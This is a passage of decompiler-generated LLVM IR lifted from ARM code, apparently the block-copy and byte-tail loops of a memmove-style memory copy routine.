  store i32 %v5_14dc4, i32* %v4_14dc4, align 4
  %v6_14dc4 = add i32 %v0_14dc4, 8
  %v7_14dc4 = inttoptr i32 %v6_14dc4 to i32*
  %v8_14dc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14dc4, i32* %v7_14dc4, align 4
  %v9_14dc4 = add i32 %v0_14dc4, 12
  %v10_14dc4 = inttoptr i32 %v9_14dc4 to i32*
  %v11_14dc4 = load i32, i32* @ip, align 4
  store i32 %v11_14dc4, i32* %v10_14dc4, align 4
  %v12_14dc4 = add i32 %v0_14dc4, 16
  store i32 %v12_14dc4, i32* %r0.global-to-local, align 4
  %v0_14dc8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14dc8 = add i32 %v0_14dc8, -16
  store i32 %v2_14dc8, i32* %r2.global-to-local, align 4
  %v6_14dcc = icmp slt i32 %v0_14dc8, 16
  br i1 %v6_14dcc, label %dec_label_pc_14dd0, label %dec_label_pc_14da0.dec_label_pc_14da0_crit_edge

dec_label_pc_14da0.dec_label_pc_14da0_crit_edge:  ; preds = %dec_label_pc_14da0
  %v0_14da0.pre = load i32, i32* @lr, align 4
  %v0_14da4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14da0

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14da0
  %v2_14dd0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14dd0, i32* @r4, align 4
  %v5_14dd0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14dd0, i32* @r5, align 4
  %v2_14dd4 = add i32 %v0_14dc8, -4
  store i32 %v2_14dd4, i32* %r2.global-to-local, align 4
  %v4_14dd4 = add i32 %v0_14dc8, 2147483632
  %v5_14dd4 = and i32 %v2_14dd4, %v4_14dd4
  %v6_14dd4 = icmp slt i32 %v5_14dd4, 0
  store i1 %v6_14dd4, i1* %cpsr_v.global-to-local, align 1
  %v7_14dd4 = icmp slt i32 %v2_14dd4, 0
  store i1 %v7_14dd4, i1* %cpsr_n.global-to-local, align 1
  %v5_14dd8 = icmp slt i32 %v2_14dc8, -12
  br i1 %v5_14dd8, label %dec_label_pc_14df4, label %dec_label_pc_14ddc

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14dd0, %dec_label_pc_14d90, %dec_label_pc_14ddc
  %v1_14de8 = phi i32 [ %v4_14de8, %dec_label_pc_14ddc ], [ %v12_14dc4, %dec_label_pc_14dd0 ], [ %v0_14cec75, %dec_label_pc_14d90 ]
  %v0_14ddc = load i32, i32* @lr, align 4
  %v3_14ddc = udiv i32 %v0_14ddc, 16777216
  store i32 %v3_14ddc, i32* %ip.global-to-local, align 4
  %v0_14de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14de0 = inttoptr i32 %v0_14de0 to i32*
  %v2_14de0 = load i32, i32* %v1_14de0, align 4
  store i32 %v2_14de0, i32* @lr, align 4
  %v4_14de0 = add i32 %v0_14de0, 4
  store i32 %v4_14de0, i32* %r1.global-to-local, align 4
  %v4_14de4 = mul i32 %v2_14de0, 256
  %v5_14de4 = or i32 %v4_14de4, %v3_14ddc
  store i32 %v5_14de4, i32* @ip, align 4
  %v2_14de8 = inttoptr i32 %v1_14de8 to i32*
  store i32 %v5_14de4, i32* %v2_14de8, align 4
  %v3_14de8 = load i32, i32* %r0.global-to-local, align 4
  %v4_14de8 = add i32 %v3_14de8, 4
  store i32 %v4_14de8, i32* %r0.global-to-local, align 4
  %v0_14dec = load i32, i32* %r2.global-to-local, align 4
  %v2_14dec = add i32 %v0_14dec, -4
  store i32 %v2_14dec, i32* %r2.global-to-local, align 4
  %v6_14df0 = icmp slt i32 %v0_14dec, 4
  br i1 %v6_14df0, label %dec_label_pc_14df4.loopexit, label %dec_label_pc_14ddc

dec_label_pc_14df4.loopexit:                      ; preds = %dec_label_pc_14ddc
  %v4_14dec = sub i32 3, %v0_14dec
  %v5_14dec = and i32 %v4_14dec, %v0_14dec
  %v6_14dec = icmp slt i32 %v5_14dec, 0
  %v7_14dec = icmp slt i32 %v2_14dec, 0
  store i1 %v6_14dec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14dec, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14df4

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14df4.loopexit, %dec_label_pc_14dd0
  %v2_14c5c114 = phi i32 [ %v4_14de8, %dec_label_pc_14df4.loopexit ], [ %v12_14dc4, %dec_label_pc_14dd0 ]
  %v0_14c4c110 = phi i32 [ %v2_14dec, %dec_label_pc_14df4.loopexit ], [ %v2_14dd4, %dec_label_pc_14dd0 ]
  %v0_14df4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14df4 = add i32 %v0_14df4, -1
  store i32 %v1_14df4, i32* @r1, align 4
  br label %bb133

dec_label_pc_14dfc:                               ; preds = %entry
  %v1_14dfc = load i32, i32* @r2, align 4
  %v2_14dfc = add i32 %v1_14dfc, %v0_14bb0
  store i32 %v2_14dfc, i32* @r1, align 4
  %v2_14e00 = add i32 %v1_14dfc, %v1_14bb0
  store i32 %v2_14e00, i32* %r0.global-to-local, align 4
  %v2_14e04 = add i32 %v1_14dfc, -4
  store i32 %v2_14e04, i32* %r2.global-to-local, align 4
  %v4_14e04 = sub i32 3, %v1_14dfc
  %v5_14e04 = and i32 %v4_14e04, %v1_14dfc
  %v6_14e04 = icmp slt i32 %v5_14e04, 0
  store i1 %v6_14e04, i1* %cpsr_v.global-to-local, align 1
  %v7_14e04 = icmp slt i32 %v2_14e04, 0
  store i1 %v7_14e04, i1* %cpsr_n.global-to-local, align 1
  %v5_14e08 = icmp slt i32 %v1_14dfc, 4
  br i1 %v5_14e08, label %bb143, label %dec_label_pc_14e0c

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14dfc
  %v1_14e0c = urem i32 %v2_14e00, 4
  store i32 %v1_14e0c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14e0c = icmp eq i32 %v1_14e0c, 0
  br i1 %v2_14e0c, label %dec_label_pc_14e14, label %dec_label_pc_14eb4

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e0c
  %v1_14e14 = urem i32 %v2_14dfc, 4
  store i32 %v1_14e14, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14e14 = icmp eq i32 %v1_14e14, 0
  br i1 %v2_14e14, label %dec_label_pc_14e1c, label %dec_label_pc_14ee0

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e14, %dec_label_pc_14ed8
  %v0_14e3449 = phi i32 [ %v2_14e00, %dec_label_pc_14e14 ], [ %v0_14f2832, %dec_label_pc_14ed8 ]
  %v0_14e3048 = phi i32 [ %v2_14dfc, %dec_label_pc_14e14 ], [ %v0_14ed8, %dec_label_pc_14ed8 ]
  %v0_14e1c = phi i32 [ %v2_14e04, %dec_label_pc_14e14 ], [ %v2_14ed0, %dec_label_pc_14ed8 ]
  %v2_14e1c = add i32 %v0_14e1c, -8
  store i32 %v2_14e1c, i32* %r2.global-to-local, align 4
  %v4_14e1c = sub i32 7, %v0_14e1c
  %v5_14e1c = and i32 %v4_14e1c, %v0_14e1c
  %v6_14e1c = icmp slt i32 %v5_14e1c, 0
  store i1 %v6_14e1c, i1* %cpsr_v.global-to-local, align 1
  %v7_14e1c = icmp slt i32 %v2_14e1c, 0
  store i1 %v7_14e1c, i1* %cpsr_n.global-to-local, align 1
  %v5_14e20 = icmp slt i32 %v0_14e1c, 8
  br i1 %v5_14e20, label %dec_label_pc_14e6c, label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e1c
  %v3_14e24 = load i32, i32* @r4, align 4
  %v5_14e24 = inttoptr i32 %v3_14e24 to i8*
  store i8* %v5_14e24, i8** %stack_var_-8, align 4
  %v8_14e24 = load i32, i32* @lr, align 4
  %v2_14e28 = add i32 %v0_14e1c, -28
  store i32 %v2_14e28, i32* %r2.global-to-local, align 4
  %v4_14e28 = sub i32 27, %v0_14e1c
  %v5_14e28 = and i32 %v4_14e28, %v2_14e1c
  %v6_14e28 = icmp slt i32 %v5_14e28, 0
  store i1 %v6_14e28, i1* %cpsr_v.global-to-local, align 1
  %v7_14e28 = icmp slt i32 %v2_14e28, 0
  store i1 %v7_14e28, i1* %cpsr_n.global-to-local, align 1
  %v5_14e2c = icmp slt i32 %v2_14e1c, 20
  br i1 %v5_14e2c, label %dec_label_pc_14e48, label %dec_label_pc_14e30

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14e24, %dec_label_pc_14e30.dec_label_pc_14e30_crit_edge
  %v0_14e34 = phi i32 [ %v1_14e3c, %dec_label_pc_14e30.dec_label_pc_14e30_crit_edge ], [ %v0_14e3449, %dec_label_pc_14e24 ]
  %v0_14e30 = phi i32 [ %v0_14e30.pre, %dec_label_pc_14e30.dec_label_pc_14e30_crit_edge ], [ %v0_14e3048, %dec_label_pc_14e24 ]
  %v1_14e30 = add i32 %v0_14e30, -4
  %v2_14e30 = inttoptr i32 %v1_14e30 to i32*
  %v3_14e30 = load i32, i32* %v2_14e30, align 4
  store i32 %v3_14e30, i32* %r3.global-to-local, align 4
  %v4_14e30 = add i32 %v0_14e30, -8
  %v5_14e30 = inttoptr i32 %v4_14e30 to i32*
  %v6_14e30 = load i32, i32* %v5_14e30, align 4
  store i32 %v6_14e30, i32* %r4.global-to-local, align 4
  %v7_14e30 = add i32 %v0_14e30, -12
  %v8_14e30 = inttoptr i32 %v7_14e30 to i32*
  %v9_14e30 = load i32, i32* %v8_14e30, align 4
  store i32 %v9_14e30, i32* %ip.global-to-local, align 4
  %v10_14e30 = add i32 %v0_14e30, -16
  %v11_14e30 = inttoptr i32 %v10_14e30 to i32*
  %v12_14e30 = load i32, i32* %v11_14e30, align 4
  store i32 %v12_14e30, i32* %lr.global-to-local, align 4
  store i32 %v10_14e30, i32* %r1.global-to-local, align 4
  %v1_14e34 = add i32 %v0_14e34, -16
  %v2_14e34 = inttoptr i32 %v1_14e34 to i32*
  store i32 %v3_14e30, i32* %v2_14e34, align 4
  %v4_14e34 = add i32 %v0_14e34, -12
  %v5_14e34 = inttoptr i32 %v4_14e34 to i32*
  %v6_14e34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14e34, i32* %v5_14e34, align 4
  %v7_14e34 = add i32 %v0_14e34, -8
  %v8_14e34 = inttoptr i32 %v7_14e34 to i32*
  %v9_14e34 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_14e34, i32* %v8_14e34, align 4
  %v10_14e34 = add i32 %v0_14e34, -4
  %v11_14e34 = inttoptr i32 %v10_14e34 to i32*
  %v12_14e34 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e34, i32* %v11_14e34, align 4
  store i32 %v1_14e34, i32* %r0.global-to-local, align 4
  %v0_14e38 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e38 = add i32 %v0_14e38, -4
  %v2_14e38 = inttoptr i32 %v1_14e38 to i32*
  %v3_14e38 = load i32, i32* %v2_14e38, align 4
  store i32 %v3_14e38, i32* %r3.global-to-local, align 4
  %v4_14e38 = add i32 %v0_14e38, -8
  %v5_14e38 = inttoptr i32 %v4_14e38 to i32*
  %v6_14e38 = load i32, i32* %v5_14e38, align 4
  store i32 %v6_14e38, i32* %r4.global-to-local, align 4
  %v7_14e38 = add i32 %v0_14e38, -12
  %v8_14e38 = inttoptr i32 %v7_14e38 to i32*
  %v9_14e38 = load i32, i32* %v8_14e38, align 4
  store i32 %v9_14e38, i32* @ip, align 4
  %v10_14e38 = add i32 %v0_14e38, -16
  %v11_14e38 = inttoptr i32 %v10_14e38 to i32*
  %v12_14e38 = load i32, i32* %v11_14e38, align 4
  store i32 %v12_14e38, i32* %lr.global-to-local, align 4
  store i32 %v10_14e38, i32* @r1, align 4
  %v1_14e3c = add i32 %v0_14e34, -32
  %v2_14e3c = inttoptr i32 %v1_14e3c to i32*
  store i32 %v3_14e38, i32* %v2_14e3c, align 4
  %v4_14e3c = add i32 %v0_14e34, -28
  %v5_14e3c = inttoptr i32 %v4_14e3c to i32*
  %v6_14e3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14e3c, i32* %v5_14e3c, align 4
  %v7_14e3c = add i32 %v0_14e34, -24
  %v8_14e3c = inttoptr i32 %v7_14e3c to i32*
  %v9_14e3c = load i32, i32* @ip, align 4
  store i32 %v9_14e3c, i32* %v8_14e3c, align 4
  %v10_14e3c = add i32 %v0_14e34, -20
  %v11_14e3c = inttoptr i32 %v10_14e3c to i32*
  %v12_14e3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e3c, i32* %v11_14e3c, align 4
  store i32 %v1_14e3c, i32* %r0.global-to-local, align 4
  %v0_14e40 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e40 = add i32 %v0_14e40, -32
  store i32 %v2_14e40, i32* %r2.global-to-local, align 4
  %v6_14e44 = icmp slt i32 %v0_14e40, 32
  br i1 %v6_14e44, label %dec_label_pc_14e48.loopexit, label %dec_label_pc_14e30.dec_label_pc_14e30_crit_edge

dec_label_pc_14e30.dec_label_pc_14e30_crit_edge:  ; preds = %dec_label_pc_14e30
  %v0_14e30.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14e30

dec_label_pc_14e48.loopexit:                      ; preds = %dec_label_pc_14e30
  %v4_14e40 = sub i32 31, %v0_14e40
  %v5_14e40 = and i32 %v4_14e40, %v0_14e40
  %v6_14e40 = icmp slt i32 %v5_14e40, 0
  %v7_14e40 = icmp slt i32 %v2_14e40, 0
  store i1 %v6_14e40, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14e40, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14e48

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e48.loopexit, %dec_label_pc_14e24
  %v6_14e50 = phi i32 [ %v1_14e3c, %dec_label_pc_14e48.loopexit ], [ %v0_14e3449, %dec_label_pc_14e24 ]
  %v0_14e58.pr = phi i32 [ %v2_14e40, %dec_label_pc_14e48.loopexit ], [ %v2_14e28, %dec_label_pc_14e24 ]
  %v4_14e48 = add i32 %v0_14e58.pr, 16
  %v6_14e48 = sub i32 0, %v0_14e58.pr
  %v7_14e48 = and i32 %v4_14e48, %v6_14e48
  %v8_14e48 = icmp slt i32 %v7_14e48, 0
  store i1 %v8_14e48, i1* %cpsr_v.global-to-local, align 1
  %v9_14e48 = icmp slt i32 %v4_14e48, 0
  store i1 %v9_14e48, i1* %cpsr_n.global-to-local, align 1
  %v5_14e4c = icmp slt i32 %v0_14e58.pr, -16
  br i1 %v5_14e4c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_14e48
  %v6_14e4c = load i32, i32* @r1, align 4
  %v7_14e4c = add i32 %v6_14e4c, -4
  %v8_14e4c = inttoptr i32 %v7_14e4c to i32*
  %v9_14e4c = load i32, i32* %v8_14e4c, align 4
  store i32 %v9_14e4c, i32* %r3.global-to-local, align 4
  %v10_14e4c = add i32 %v6_14e4c, -8
  %v11_14e4c = inttoptr i32 %v10_14e4c to i32*
  %v12_14e4c = load i32, i32* %v11_14e4c, align 4
  store i32 %v12_14e4c, i32* %r4.global-to-local, align 4
  %v13_14e4c = add i32 %v6_14e4c, -12
  %v14_14e4c = inttoptr i32 %v13_14e4c to i32*
  %v15_14e4c = load i32, i32* %v14_14e4c, align 4
  store i32 %v15_14e4c, i32* @ip, align 4
  %v16_14e4c = add i32 %v6_14e4c, -16
  %v17_14e4c = inttoptr i32 %v16_14e4c to i32*
  %v18_14e4c = load i32, i32* %v17_14e4c, align 4
  store i32 %v18_14e4c, i32* %lr.global-to-local, align 4
  store i32 %v16_14e4c, i32* @r1, align 4
  %v7_14e50 = add i32 %v6_14e50, -16
  %v8_14e50 = inttoptr i32 %v7_14e50 to i32*
  store i32 %v9_14e4c, i32* %v8_14e50, align 4
  %v10_14e50 = add i32 %v6_14e50, -12
  %v11_14e50 = inttoptr i32 %v10_14e50 to i32*
  %v12_14e50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_14e50, i32* %v11_14e50, align 4
  %v13_14e50 = add i32 %v6_14e50, -8
  %v14_14e50 = inttoptr i32 %v13_14e50 to i32*
  %v15_14e50 = load i32, i32* @ip, align 4
  store i32 %v15_14e50, i32* %v14_14e50, align 4
  %v16_14e50 = add i32 %v6_14e50, -4
  %v17_14e50 = inttoptr i32 %v16_14e50 to i32*
  %v18_14e50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_14e50, i32* %v17_14e50, align 4
  store i32 %v7_14e50, i32* %r0.global-to-local, align 4
  %v6_14e54 = load i32, i32* %r2.global-to-local, align 4
  %v7_14e54 = add i32 %v6_14e54, -16
  store i32 %v7_14e54, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_14e48, %bb140
  %v6_14e60 = phi i32 [ %v7_14e50, %bb140 ], [ %v6_14e50, %dec_label_pc_14e48 ]
  %v0_14e58 = phi i32 [ %v7_14e54, %bb140 ], [ %v0_14e58.pr, %dec_label_pc_14e48 ]
  %v4_14e58 = add i32 %v0_14e58, 20
  store i32 %v4_14e58, i32* %r2.global-to-local, align 4
  %v6_14e58 = sub i32 0, %v0_14e58
  %v7_14e58 = and i32 %v4_14e58, %v6_14e58
  %v8_14e58 = icmp slt i32 %v7_14e58, 0
  store i1 %v8_14e58, i1* %cpsr_v.global-to-local, align 1
  %v9_14e58 = icmp slt i32 %v4_14e58, 0
  store i1 %v9_14e58, i1* %cpsr_n.global-to-local, align 1
  %v5_14e5c = icmp slt i32 %v0_14e58, -20
  br i1 %v5_14e5c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_14e5c = load i32, i32* @r1, align 4
  %v7_14e5c = add i32 %v6_14e5c, -4
  %v8_14e5c = inttoptr i32 %v7_14e5c to i32*
  %v9_14e5c = load i32, i32* %v8_14e5c, align 4
  store i32 %v9_14e5c, i32* %r3.global-to-local, align 4
  %v10_14e5c = add i32 %v6_14e5c, -8
  %v11_14e5c = inttoptr i32 %v10_14e5c to i32*
  %v12_14e5c = load i32, i32* %v11_14e5c, align 4
  store i32 %v12_14e5c, i32* @ip, align 4
  %v13_14e5c = add i32 %v6_14e5c, -12
  %v14_14e5c = inttoptr i32 %v13_14e5c to i32*
  %v15_14e5c = load i32, i32* %v14_14e5c, align 4
  store i32 %v15_14e5c, i32* %lr.global-to-local, align 4
  store i32 %v13_14e5c, i32* @r1, align 4
  %v7_14e60 = add i32 %v6_14e60, -12
  %v8_14e60 = inttoptr i32 %v7_14e60 to i32*
  store i32 %v9_14e5c, i32* %v8_14e60, align 4
  %v10_14e60 = add i32 %v6_14e60, -8
  %v11_14e60 = inttoptr i32 %v10_14e60 to i32*
  %v12_14e60 = load i32, i32* @ip, align 4
  store i32 %v12_14e60, i32* %v11_14e60, align 4
  %v13_14e60 = add i32 %v6_14e60, -4
  %v14_14e60 = inttoptr i32 %v13_14e60 to i32*
  %v15_14e60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_14e60, i32* %v14_14e60, align 4
  store i32 %v7_14e60, i32* %r0.global-to-local, align 4
  %v6_14e64 = load i32, i32* %r2.global-to-local, align 4
  %v7_14e64 = add i32 %v6_14e64, -12
  store i32 %v7_14e64, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_14e8457 = phi i32 [ %v6_14e60, %.thread14 ], [ %v7_14e60, %bb141 ]
  %v0_14e6c55 = phi i32 [ %v4_14e58, %.thread14 ], [ %v7_14e64, %bb141 ]
  %v2_14e68 = load i8*, i8** %stack_var_-8, align 4
  %v3_14e68 = ptrtoint i8* %v2_14e68 to i32
  store i32 %v3_14e68, i32* @r4, align 4
  store i32 %v8_14e24, i32* @lr, align 4
  br label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_14e1c, %.thread16
  %v7_14e7c = phi i32 [ %v0_14e3449, %dec_label_pc_14e1c ], [ %v6_14e8457, %.thread16 ]
  %v0_14e6c = phi i32 [ %v2_14e1c, %dec_label_pc_14e1c ], [ %v0_14e6c55, %.thread16 ]
  %v2_14e6c = add i32 %v0_14e6c, 8
  store i32 %v2_14e6c, i32* %r2.global-to-local, align 4
  %v4_14e6c = sub i32 0, %v0_14e6c
  %v5_14e6c = and i32 %v2_14e6c, %v4_14e6c
  %v6_14e6c = icmp slt i32 %v5_14e6c, 0
  store i1 %v6_14e6c, i1* %cpsr_v.global-to-local, align 1
  %v7_14e6c = icmp slt i32 %v2_14e6c, 0
  store i1 %v7_14e6c, i1* %cpsr_n.global-to-local, align 1
  %v5_14e70 = icmp slt i32 %v0_14e6c, -8
  br i1 %v5_14e70, label %bb143, label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e6c
  %v6_14e74 = add i32 %v0_14e6c, 4
  store i32 %v6_14e74, i32* %r2.global-to-local, align 4
  %v8_14e74 = sub i32 -5, %v0_14e6c
  %v9_14e74 = and i32 %v8_14e74, %v2_14e6c
  %v10_14e74 = icmp slt i32 %v9_14e74, 0
  store i1 %v10_14e74, i1* %cpsr_v.global-to-local, align 1
  %v11_14e74 = icmp slt i32 %v6_14e74, 0
  store i1 %v11_14e74, i1* %cpsr_n.global-to-local, align 1
  %v5_14e78 = icmp slt i32 %v2_14e6c, 4
  %v6_14e78 = load i32, i32* @r1, align 4
  %v7_14e78 = add i32 %v6_14e78, -4
  %v8_14e78 = inttoptr i32 %v7_14e78 to i32*
  %v9_14e78 = load i32, i32* %v8_14e78, align 4
  store i32 %v9_14e78, i32* %r3.global-to-local, align 4
  br i1 %v5_14e78, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_14e74
  store i32 %v7_14e78, i32* @r1, align 4
  %v8_14e7c = add i32 %v7_14e7c, -4
  %v9_14e7c = inttoptr i32 %v8_14e7c to i32*
  store i32 %v9_14e78, i32* %v9_14e7c, align 4
  %v10_14e7c = load i32, i32* %r0.global-to-local, align 4
  %v11_14e7c = add i32 %v10_14e7c, -4
  store i32 %v11_14e7c, i32* %r0.global-to-local, align 4
  %v0_14e8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_14e74
  %v10_14e80 = add i32 %v6_14e78, -8
  %v11_14e80 = inttoptr i32 %v10_14e80 to i32*
  %v12_14e80 = load i32, i32* %v11_14e80, align 4
  store i32 %v12_14e80, i32* @ip, align 4
  store i32 %v10_14e80, i32* @r1, align 4
  %v7_14e84 = add i32 %v7_14e7c, -8
  %v8_14e84 = inttoptr i32 %v7_14e84 to i32*
  store i32 %v9_14e78, i32* %v8_14e84, align 4
  %v10_14e84 = add i32 %v7_14e7c, -4
  %v11_14e84 = inttoptr i32 %v10_14e84 to i32*
  %v12_14e84 = load i32, i32* @ip, align 4
  store i32 %v12_14e84, i32* %v11_14e84, align 4
  store i32 %v7_14e84, i32* %r0.global-to-local, align 4
  %v6_14e88 = load i32, i32* %r2.global-to-local, align 4
  %v7_14e88 = add i32 %v6_14e88, -4
  store i32 %v7_14e88, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_14e6c, %dec_label_pc_14dfc, %dec_label_pc_15030, %dec_label_pc_14fc4, %dec_label_pc_14f58, %bb142
  %v2_14e90 = phi i32 [ %v11_14e7c, %.thread20 ], [ %v0_14f2832, %.thread26 ], [ %v7_14e7c, %dec_label_pc_14e6c ], [ %v2_14e00, %dec_label_pc_14dfc ], [ %v2_14e9c65, %dec_label_pc_15030 ], [ %v2_14e9c64, %dec_label_pc_14fc4 ], [ %v2_14e9c63, %dec_label_pc_14f58 ], [ %v7_14e84, %bb142 ]
  %v0_14e8c = phi i32 [ %v0_14e8c.pre, %.thread20 ], [ %v2_14ed0, %.thread26 ], [ %v2_14e6c, %dec_label_pc_14e6c ], [ %v2_14e04, %dec_label_pc_14dfc ], [ %v0_14e8c61, %dec_label_pc_15030 ], [ %v0_14e8c60, %dec_label_pc_14fc4 ], [ %v0_14e8c59, %dec_label_pc_14f58 ], [ %v7_14e88, %bb142 ]
  %v1_14e8c = add i32 %v0_14e8c, 4
  store i32 %v1_14e8c, i32* @r2, align 4
  %v3_14e8c = sub i32 0, %v0_14e8c
  %v4_14e8c = and i32 %v1_14e8c, %v3_14e8c
  %v5_14e8c = icmp slt i32 %v4_14e8c, 0
  store i1 %v5_14e8c, i1* %cpsr_v.global-to-local, align 1
  %v6_14e8c = icmp slt i32 %v1_14e8c, 0
  store i1 %v6_14e8c, i1* %cpsr_n.global-to-local, align 1
  %v7_14e8c = icmp eq i32 %v1_14e8c, 0
  store i1 %v7_14e8c, i1* @cpsr_z, align 1
  br i1 %v7_14e8c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_14e94 = add i32 %v0_14e8c, 2
  %v3_14e94 = sub i32 -3, %v0_14e8c
  %v4_14e94 = and i32 %v3_14e94, %v1_14e8c
  %v5_14e94 = icmp slt i32 %v4_14e94, 0
  store i1 %v5_14e94, i1* %cpsr_v.global-to-local, align 1
  %v6_14e94 = icmp slt i32 %v1_14e94, 0
  store i1 %v6_14e94, i1* %cpsr_n.global-to-local, align 1
  %v7_14e94 = icmp eq i32 %v1_14e8c, 2
  store i1 %v7_14e94, i1* @cpsr_z, align 1
  %v0_14e98 = load i32, i32* @r1, align 4
  %v1_14e98 = add i32 %v0_14e98, -1
  %v2_14e98 = inttoptr i32 %v1_14e98 to i8*
  %v3_14e98 = load i8, i8* %v2_14e98, align 1
  %v4_14e98 = zext i8 %v3_14e98 to i32
  store i32 %v4_14e98, i32* %r3.global-to-local, align 4
  store i32 %v1_14e98, i32* @r1, align 4
  %v3_14e9c = add i32 %v2_14e90, -1
  %v4_14e9c = inttoptr i32 %v3_14e9c to i8*
  store i8 %v3_14e98, i8* %v4_14e9c, align 1
  %v5_14e9c = load i32, i32* %r0.global-to-local, align 4
  %v6_14e9c = add i32 %v5_14e9c, -1
  store i32 %v6_14e9c, i32* %r0.global-to-local, align 4
  %v0_14ea0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14ea0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14ea0 = xor i1 %v0_14ea0, %v1_14ea0
  br i1 %v2_14ea0, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_14ea0 = load i32, i32* @r1, align 4
  %v4_14ea0 = add i32 %v3_14ea0, -1
  %v5_14ea0 = inttoptr i32 %v4_14ea0 to i8*
  %v6_14ea0 = load i8, i8* %v5_14ea0, align 1
  %v7_14ea0 = zext i8 %v6_14ea0 to i32
  store i32 %v7_14ea0, i32* %r3.global-to-local, align 4
  store i32 %v4_14ea0, i32* @r1, align 4
  %v6_14ea4 = add i32 %v5_14e9c, -2
  %v7_14ea4 = inttoptr i32 %v6_14ea4 to i8*
  store i8 %v6_14ea0, i8* %v7_14ea4, align 1
  %v8_14ea4 = load i32, i32* %r0.global-to-local, align 4
  %v9_14ea4 = add i32 %v8_14ea4, -1
  store i32 %v9_14ea4, i32* %r0.global-to-local, align 4
  %v1_14ea8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14ea8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_14eac = phi i32 [ %v9_14ea4, %bb145 ], [ %v6_14e9c, %bb144 ]
  %v2_14eac = phi i1 [ %v2_14ea8.pre, %bb145 ], [ %v1_14ea0, %bb144 ]
  %v1_14eac = phi i1 [ %v1_14ea8.pre, %bb145 ], [ %v0_14ea0, %bb144 ]
  %v0_14ea8 = load i1, i1* @cpsr_z, align 1
  %v3_14ea8 = xor i1 %v2_14eac, %v1_14eac
  %v4_14ea8 = or i1 %v0_14ea8, %v3_14ea8
  br i1 %v4_14ea8, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_14ea8 = load i32, i32* @r1, align 4
  %v6_14ea8 = add i32 %v5_14ea8, -1
  %v7_14ea8 = inttoptr i32 %v6_14ea8 to i8*
  %v8_14ea8 = load i8, i8* %v7_14ea8, align 1
  %v9_14ea8 = zext i8 %v8_14ea8 to i32
  store i32 %v9_14ea8, i32* %r3.global-to-local, align 4
  store i32 %v6_14ea8, i32* @r1, align 4
  %v8_14eac = add i32 %v7_14eac, -1
  %v9_14eac = inttoptr i32 %v8_14eac to i8*
  store i8 %v8_14ea8, i8* %v9_14eac, align 1
  %v10_14eac = load i32, i32* %r0.global-to-local, align 4
  %v11_14eac = add i32 %v10_14eac, -1
  store i32 %v11_14eac, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_14eb4:                               ; preds = %dec_label_pc_14e0c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14eb4 = icmp eq i32 %v1_14e0c, 1
  store i1 %v8_14eb4, i1* %cpsr_n.global-to-local, align 1
  %v1_14eb8 = add i32 %v2_14dfc, -1
  %v2_14eb8 = inttoptr i32 %v1_14eb8 to i8*
  %v3_14eb8 = load i8, i8* %v2_14eb8, align 1
  %v4_14eb8 = zext i8 %v3_14eb8 to i32
  store i32 %v4_14eb8, i32* %r3.global-to-local, align 4
  store i32 %v1_14eb8, i32* @r1, align 4
  %v3_14ebc = add i32 %v2_14e00, -1
  %v4_14ebc = inttoptr i32 %v3_14ebc to i8*
  store i8 %v3_14eb8, i8* %v4_14ebc, align 1
  %v5_14ebc = load i32, i32* %r0.global-to-local, align 4
  %v6_14ebc = add i32 %v5_14ebc, -1
